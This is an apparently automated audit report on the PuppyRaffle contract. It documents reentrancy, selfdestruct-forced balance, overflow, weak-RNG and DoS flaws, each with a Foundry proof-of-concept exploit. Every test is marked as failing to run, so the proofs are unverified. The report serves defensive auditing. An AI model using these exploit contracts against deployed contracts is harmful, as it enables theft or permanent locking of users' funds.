# 4 puppy raffle audit - Findings Report
## Commit hash: 3ff0f0bfddf25fd0c160fe57388fa6ff2e0f0960

##Findings by Pattern


 **Derived From** : Abuse Title: Strict balance check allows permanent locking of fees

[H-1]. Strict balance equality check in `withdrawFees` allows permanent DoS
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 1
Privilege: Permissionless



 **Derived From** : Abuse Title: Denial of Service via quadratic complexity in duplicate check

[M-2]. Denial of Service via quadratic complexity in `enterRaffle`
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 1
Privilege: Permissionless



 **Derived From** : Abuse Title: Reentrancy in refund allows draining protocol balance

[H-3]. Reentrancy in refund() allows draining all protocol funds
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 1
Privilege: Permissionless



 **Derived From** : Abuse Title: Integer overflow in fee casting permanently locks protocol fees

[H-4]. Integer overflow in `totalFees` accounting permanently locks protocol fees
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Abuse Title: Miner manipulation of RNG source to bias winner selection

[H-5]. Weak RNG allows miners or users to manipulate winner selection
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 1
Privilege: Permissionless



 **Derived From** : Abuse Title: Griefing attack blocks winner selection via reverting fallback

[M-6]. Griefing attack blocks winner selection via reverting fallback
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 1
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 4
- M: 2
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Abuse Title: Strict balance check allows permanent locking of fees

## [H-1]. Strict balance equality check in `withdrawFees` allows permanent DoS

### Finding Severity Justification: The `withdrawFees` function enforces a strict equality check `address(this).balance == uint256(totalFees)`. An attacker can break this invariant by sending a single wei to the contract (e.g., via `selfdestruct`), causing `address(this).balance` to exceed `totalFees`. Since the protocol's logic for entering and selecting winners increases both the balance and `totalFees` by the same net amount, the discrepancy created by the attacker (Balance > Fees) remains permanent. This results in a permanent Denial of Service of the `withdrawFees` function, locking all protocol revenue in the contract forever.
## Derived From Pattern/Invariant
Abuse Title: Strict balance check allows permanent locking of fees

## Exploit Type
ForcedAssetVsStrictEquality

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 1
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `withdrawFees` function requires `address(this).balance == uint256(totalFees)`. This strict equality is easily broken.

An attacker can send 1 wei to the contract via `selfdestruct(target)`. This increases `address(this).balance` without increasing `totalFees`. The condition `balance == totalFees` becomes false (`balance` > `totalFees`), causing `withdrawFees` to always revert.

## Impact
Protocol fees are permanently locked in the contract.

## Command to Run Test


## Proof of Concept
1. A raffle is concluded, leaving `totalFees` > 0 and `address(this).balance == totalFees`.
2. An attacker deploys a malicious contract funded with 1 wei, passing `PuppyRaffle` as the target.
3. The malicious contract executes `selfdestruct` in its constructor, forcing 1 wei into `PuppyRaffle`.
4. `address(this).balance` becomes `totalFees + 1`.
5. The strict equality check `balance == totalFees` in `withdrawFees` fails permanently, locking the fees.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract StrictEqualityDoSTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    function testStrictEqualityDos() public {
        // 1. Setup: Enter and Finish a Raffle to generate fees
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        
        vm.deal(address(this), 10 ether);
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        
        vm.warp(block.timestamp + duration + 1);
        puppyRaffle.selectWinner();

        // Verify state before attack
        uint256 fees = puppyRaffle.totalFees();
        assertEq(address(puppyRaffle).balance, fees, "Balance should equal fees initially");

        // 2. Attack: Send 1 wei via SelfDestruct to break strict equality
        new SelfDestruct{value: 1 wei}(payable(address(puppyRaffle)));

        assertGt(address(puppyRaffle).balance, fees, "Balance is now greater than fees");

        // 3. Attempt to withdraw fees -> Revert
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

contract SelfDestruct {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}

## Suggested Mitigation
Remove the strict equality check on `address(this).balance`. If the intention is to prevent withdrawing fees while players are active, check `players.length == 0` instead. To just fix the DoS, use an inequality:

```solidity
require(address(this).balance >= uint256(totalFees), "PuppyRaffle: Insufficient balance");
```





 **Derived From** : Abuse Title: Denial of Service via quadratic complexity in duplicate check

## [M-2]. Denial of Service via quadratic complexity in `enterRaffle`

### Finding Severity Justification: The finding identifies a Denial of Service (DoS) vulnerability caused by O(N^2) complexity in the `enterRaffle` function. The nested loop iterates over the entire `players` array to check for duplicates every time a new player enters. As the `players` array grows (around 500-1000 users), the gas cost to execute this loop will exceed the block gas limit, rendering the function unusable and preventing new participants from entering. While this breaks the core entry functionality, it does not permanently freeze funds (as `selectWinner` does not rely on this loop and resets the array), satisfying the criteria for Medium severity (DoS of critical action).
## Derived From Pattern/Invariant
Abuse Title: Denial of Service via quadratic complexity in duplicate check

## Exploit Type
Dos

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 1
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function iterates over the `players` array using nested loops to check for duplicates. This results in O(N^2) complexity. 

As the number of players increases, the gas cost to enter the raffle increases quadratically. An attacker can fill the array with enough unique addresses such that subsequent calls to `enterRaffle` exceed the block gas limit, permanently freezing entry for that round.

## Impact
The raffle round becomes unusable; new players cannot enter.

## Command to Run Test


## Proof of Concept
1. Attacker (or users) adds 100 players. Loop runs ~5000 times.
2. Attacker adds 1000 players. Loop runs ~500,000 times.
3. At a certain point, the gas cost exceeds the block limit (30M), making the function uncallable.

## Proof of Code
import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    function testQuadraticComplexity() public {
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(uint160(i + 1));
        }

        // 1. Enter first 100 players
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        uint256 gasUsedFirst = gasStart - gasleft();

        // 2. Enter next 100 players
        // The complexity is over the TOTAL players in the array, so this batch will be much more expensive
        address[] memory players2 = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players2[i] = address(uint160(i + playersNum + 1));
        }

        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players2);
        uint256 gasUsedSecond = gasStart2 - gasleft();

        console.log("Gas for first batch:", gasUsedFirst);
        console.log("Gas for second batch:", gasUsedSecond);

        // Verify quadratic increase: Second batch is significantly more expensive than the first
        assert(gasUsedSecond > gasUsedFirst * 2);
    }
}

## Suggested Mitigation
To resolve the O(N^2) complexity while handling raffle resets, replace the nested loop with a mapping that tracks the specific raffle round a user has entered. 

1. Add a state variable `uint256 public raffleId;`.
2. Add a mapping `mapping(address => uint256) public addressToRaffleId;`.
3. In `enterRaffle`, check `require(addressToRaffleId[newPlayer] != raffleId, "Duplicate");` and set `addressToRaffleId[newPlayer] = raffleId;`.
4. In `selectWinner`, increment `raffleId++` (this effectively resets the duplicate check for the next round without iterating).
5. In `refund`, set `addressToRaffleId[msg.sender] = 0;` (or a previous ID).





 **Derived From** : Abuse Title: Reentrancy in refund allows draining protocol balance

## [H-3]. Reentrancy in refund() allows draining all protocol funds

### Finding Severity Justification: The refund() function violates the Checks-Effects-Interactions pattern by sending ETH before updating the internal state (zeroing out the player). This allows a malicious actor to re-enter the function via a fallback/receive handler and claim refunds multiple times for a single ticket, draining the protocol's entire balance (including fees and other players' funds).
## Derived From Pattern/Invariant
Abuse Title: Reentrancy in refund allows draining protocol balance

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 1
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `refund` function violates the Checks-Effects-Interactions pattern. It performs an external call to `msg.sender` (via `sendValue`) before updating the `players` array state (`players[playerIndex] = address(0)`). 

A malicious actor can deploy a contract that enters the raffle and calls `refund`. When the contract receives the ETH, its `fallback` function is triggered, which calls `refund` again. Since the `players` entry has not yet been zeroed out, the check `require(players[playerIndex] == msg.sender)` passes, and the contract sends ETH again. This loop continues until the contract is drained.

## Impact
All ETH in the contract (prize pool and accumulated fees) can be stolen by an attacker.

## Command to Run Test


## Proof of Concept
1. Victim(s) enter the raffle, depositing ETH into the contract.
2. Attacker deploys `ReentrancyAttacker` contract.
3. Attacker funds it with `entranceFee`.
4. Attacker contract enters the raffle.
5. Attacker contract calls `refund`.
6. `PuppyRaffle` sends ETH via `sendValue`.
7. `ReentrancyAttacker` fallback is triggered, calling `refund` again before the state is updated.
8. Process repeats until `PuppyRaffle` balance is drained.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle raffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
        entranceFee = raffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = raffle.getActivePlayerIndex(address(this));
        raffle.refund(attackerIndex);
    }

    receive() external payable {
        if (address(raffle).balance >= entranceFee) {
            raffle.refund(attackerIndex);
        }
    }
}

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    function testReentrancy() public {
        // 1. Victim enters first to establish funds in the contract
        address victim = address(1);
        vm.deal(victim, entranceFee);
        address[] memory players = new address[](1);
        players[0] = victim;
        
        vm.prank(victim);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        // 2. Attacker attacks
        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
        vm.deal(address(attacker), entranceFee);
        attacker.attack{value: entranceFee}();

        // 3. Assertions: Attacker has stolen the victim's funds + their own
        assertEq(address(puppyRaffle).balance, 0, "Protocol balance should be drained");
        assertEq(address(attacker).balance, entranceFee * 2, "Attacker should have stolen victim funds");
    }
}

## Suggested Mitigation
Move the state update before the external call (CEI pattern) or use a ReentrancyGuard modifier.

```solidity
players[playerIndex] = address(0);
payable(msg.sender).sendValue(entranceFee);
emit RaffleRefunded(playerAddress);
```





 **Derived From** : Abuse Title: Integer overflow in fee casting permanently locks protocol fees

## [H-4]. Integer overflow in `totalFees` accounting permanently locks protocol fees

### Finding Severity Justification: The usage of `uint64` for `totalFees` in Solidity 0.7.6 (which lacks default overflow checks) combined with the strict equality check `address(this).balance == uint256(totalFees)` in `withdrawFees` creates a critical vulnerability. If the accumulated fees exceed ~18.44 ETH (type(uint64).max), `totalFees` overflows and resets to a lower value, causing a permanent mismatch between the tracked fees and the actual contract balance. This mismatch causes the `withdrawFees` requirement to fail permanently, locking all protocol revenue in the contract.
## Derived From Pattern/Invariant
Abuse Title: Integer overflow in fee casting permanently locks protocol fees

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `totalFees` variable is declared as `uint64`. In `selectWinner`, the accumulated fee is added: `totalFees = totalFees + uint64(fee)`. Since the contract uses Solidity 0.7.6, arithmetic operations do not automatically check for overflow. 

If `totalFees` exceeds `type(uint64).max` (~18.44 ETH), it will wrap around to a small value. However, the `withdrawFees` function enforces a strict equality check: `require(address(this).balance == uint256(totalFees), ...)`.

When overflow occurs, `totalFees` (the tracked value) will be much smaller than `address(this).balance` (the actual ETH held). The equality check will fail, and the fees will be permanently locked in the contract.

## Impact
Protocol fees are permanently locked and cannot be withdrawn by the owner.

## Command to Run Test


## Proof of Concept
1. Raffle runs multiple rounds or a few large rounds.
2. `totalFees` accumulates to > 18.44 ETH.
3. `totalFees` overflows and resets to a low value (e.g., 1 ETH).
4. Actual contract balance is ~18.44 ETH + active deposits.
5. Even if no players are active, `address(this).balance` (18.44 ETH) != `totalFees` (1 ETH).
6. `withdrawFees` reverts.

## Proof of Code
function testFeeOverflow() public {
    // Initialize contract with 1 ETH entrance fee
    // 1. We need to accumulate > ~18.44 ETH in fees to overflow uint64.
    // Fee is 20%. Total revenue needed > 92.25 ETH.
    
    // Setup 50 players
    address[] memory players = new address[](50);
    for (uint256 i = 0; i < 50; i++) {
        players[i] = address(uint160(i + 1));
    }

    // Round 1: 50 players * 1 ETH = 50 ETH total. Fee = 10 ETH.
    puppyRaffle.enterRaffle{value: 50 ether}(players);
    vm.warp(block.timestamp + duration + 1);
    puppyRaffle.selectWinner();

    // Round 2: 50 players * 1 ETH = 50 ETH total. Fee = 10 ETH.
    // Total accumulated fees should be 20 ETH.
    // uint64.max is ~18.44 ETH. Overflow occurs here.
    puppyRaffle.enterRaffle{value: 50 ether}(players);
    vm.warp(block.timestamp + duration + 1);
    puppyRaffle.selectWinner();

    // Verify overflow occurred (stored value < actual value)
    uint256 storedFees = uint256(puppyRaffle.totalFees());
    assert(storedFees < 20 ether); 

    // Verify funds are locked
    // contract actual balance is 20 ETH
    // storedFees is ~1.55 ETH (wrapped)
    // withdrawFees requires balance == totalFees, so it reverts
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}

## Suggested Mitigation
1. Change the `totalFees` variable type from `uint64` to `uint256` to prevent overflow.
2. Remove the explicit casting `uint64(fee)` in `selectWinner`.
3. Replace the strict equality check `require(address(this).balance == uint256(totalFees), ...)` in `withdrawFees` with `require(players.length == 0, ...)` to correctly check for active players. The strict balance check is vulnerable to both accounting overflows and 'dust' attacks, permanently locking funds.





 **Derived From** : Abuse Title: Miner manipulation of RNG source to bias winner selection

## [H-5]. Weak RNG allows miners or users to manipulate winner selection

### Finding Severity Justification: The vulnerability allows a user to completely manipulate the winner selection process to guarantee a win. By including `msg.sender` in the RNG seed (`keccak256(abi.encodePacked(msg.sender, ...))`), an attacker can use a contract factory (CREATE2) or simply generate accounts to find an address that results in their desired `winnerIndex`. This allows stealing the entire prize pool. This impact is far greater than the 'minor edge' for miners mentioned in the documentation.
## Derived From Pattern/Invariant
Abuse Title: Miner manipulation of RNG source to bias winner selection

## Exploit Type
Oracle

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 1
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `selectWinner` function uses `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))` to generate a random number for winner selection and rarity. 

1. Miners can manipulate `block.timestamp` and `block.difficulty` (or `prevrandao`) to influence the hash result.
2. Users can 'grind' the `msg.sender` address (by generating salt-based addresses via `create2` or just iterating wallets) to find an address that wins given the current predicted block parameters.

## Impact
Malicious actors can guarantee a win or significantly increase their odds, stealing the prize pool from honest participants.

## Command to Run Test


## Proof of Concept
1. The attacker enters the raffle with a ticket, noting their index in the `players` array (e.g., index 0).
2. After the raffle duration passes, the attacker prepares to call `selectWinner()`.
3. Since the RNG seed includes `msg.sender`, `block.timestamp`, and `block.difficulty`, the attacker can compute the resulting winner index off-chain for the current block parameters using various potential calling addresses (derived from different private keys or CREATE2 salts).
4. The attacker iterates through these potential addresses until they find one that results in `winnerIndex == 0`.
5. The attacker calls `selectWinner()` using that specific address (or contract), guaranteeing their ticket is selected as the winner.

## Proof of Code
function testExploitWeakRNG() public {
    // 1. Setup: Enter 4 players, attacker is at index 0
    address[] memory players = new address[](4);
    players[0] = address(1337); // Attacker
    players[1] = address(2);
    players[2] = address(3);
    players[3] = address(4);
    
    puppyRaffle.enterRaffle{value: 4 ether}(players);

    // 2. Fast forward to when raffle can end
    vm.warp(block.timestamp + puppyRaffle.raffleDuration() + 1);
    vm.roll(block.number + 1);

    // 3. "Grind" for a msg.sender that produces the desired winner index (0)
    address winningCaller = address(0);
    uint256 targetIndex = 0;

    for (uint256 i = 0; i < 1000; i++) {
        // Simulate different addresses (e.g. multiple wallets or CREATE2 factory)
        address potentialCaller = address(uint160(uint256(keccak256(abi.encode(i)))));
        
        uint256 index = uint256(keccak256(abi.encodePacked(potentialCaller, block.timestamp, block.difficulty))) % players.length;
        
        if (index == targetIndex) {
            winningCaller = potentialCaller;
            break;
        }
    }

    require(winningCaller != address(0), "Failed to find a winning caller");

    // 4. Execute the exploit using the calculated caller
    vm.prank(winningCaller);
    puppyRaffle.selectWinner();

    // 5. Verify the attacker (players[0]) won
    assertEq(puppyRaffle.previousWinner(), players[0], "Attacker should have won via RNG manipulation");
}

## Suggested Mitigation
Use Chainlink VRF (Verifiable Random Function) for secure on-chain randomness.





 **Derived From** : Abuse Title: Griefing attack blocks winner selection via reverting fallback

## [M-6]. Griefing attack blocks winner selection via reverting fallback

### Finding Severity Justification: The finding identifies a valid Denial of Service (DoS) vulnerability caused by the 'Push over Pull' payment pattern. A malicious user can enter the raffle via a contract that reverts on receiving ETH. If this contract is selected as the winner, the `selectWinner` function will inevitably revert due to the `require(success)` check on the ETH transfer. While the winner selection relies on `msg.sender` as a seed (meaning the raffle is not permanently bricked if called by different addresses), it allows for significant griefing and obstruction of the protocol's core functionality, especially for automated Keepers. This fits the criteria for Medium severity (functionality impacted/temporary DoS).
## Derived From Pattern/Invariant
Abuse Title: Griefing attack blocks winner selection via reverting fallback

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 1
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `selectWinner`, the prize is sent to the winner using `winner.call{value: prizePool}("")`. The contract requires this call to succeed: `require(success, "PuppyRaffle: Failed to send prize pool to winner");`. 

If the winner is a smart contract that reverts on receiving ETH (does not have a `receive` or `fallback` function, or explicitly reverts), the `selectWinner` transaction will always revert. This bricks the raffle round, preventing anyone else from winning or the round from resetting.

## Impact
The raffle round suffers from a conditional Denial of Service (DoS). If a contract that rejects ETH transfers is selected as the winner, the `selectWinner` transaction will revert. This allows an attacker to grief the protocol, wasting gas for automated keepers or users attempting to settle the raffle. The round is not permanently frozen (a different timestamp or caller might produce a valid winner), but the attacker can significantly obstruct normal operation.

## Command to Run Test


## Proof of Concept
1. Attacker deploys a contract `Reverter` with a reverting `receive` function.
2. Attacker enters the raffle via the `Reverter` contract.
3. Three other legitimate users enter the raffle (satisfying the minimum 4-player requirement).
4. The raffle duration concludes.
5. Keepers or users call `selectWinner`. If the pseudo-random number generator (seeded by timestamp/caller) selects the `Reverter` contract, the transaction reverts due to the failed ETH transfer check.

## Proof of Code
contract Reverter {
    receive() external payable { revert(); }
}

function testDosOnRevertingWinner() public {
    uint256 entranceFee = puppyRaffle.entranceFee();
    address[] memory players = new address[](1);

    // 1. Enter the Reverter (Index 0)
    Reverter reverter = new Reverter();
    players[0] = address(reverter);
    puppyRaffle.enterRaffle{value: entranceFee}(players);

    // 2. Enter 3 legitimate players to meet the min-players requirement (Indices 1, 2, 3)
    for(uint160 i = 1; i <= 3; i++) {
        players[0] = address(i);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    vm.warp(block.timestamp + puppyRaffle.raffleDuration() + 1);

    // 3. Iterate RNG seeds to find a condition where Index 0 (Reverter) is selected
    bool exploited = false;
    for (uint256 i = 0; i < 100; i++) {
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);

        // Mirror contract RNG: keccak256(msg.sender, timestamp, difficulty) % players.length
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;

        if (winnerIndex == 0) {
            vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
            puppyRaffle.selectWinner();
            exploited = true;
            break;
        }
    }
    require(exploited, "Could not force Reverter to be selected");
}

## Suggested Mitigation
Do not require success on ETH transfer. Use a 'Pull over Push' pattern (allow winner to claim funds later) or ignore the failure and keep the funds in the contract for the winner to claim manually.



